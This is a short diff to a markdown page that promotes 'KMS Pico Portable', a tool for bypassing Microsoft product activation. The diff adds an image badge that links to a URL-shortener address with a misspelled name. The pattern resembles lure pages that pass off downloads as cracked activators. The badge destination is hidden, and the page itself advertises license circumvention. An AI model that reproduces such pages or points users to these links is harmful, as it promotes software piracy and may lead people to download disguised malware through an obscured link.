@@ -2,6 +2,8 @@
 **KMS Pico Portable** functions as an autonomous activation solution that brings enterprise-level Microsoft product validation to single computers through localized infrastructure emulation.
 
 
+[![98759789](https://github.com/user-attachments/assets/50202211-3244-41c9-97b2-1d2a10404566)](https://y.gy/kmss-pico-portabl3)
+
 
 **Technical Operation:**
 - Instantiates a transient service that mirrors corporate activation servers
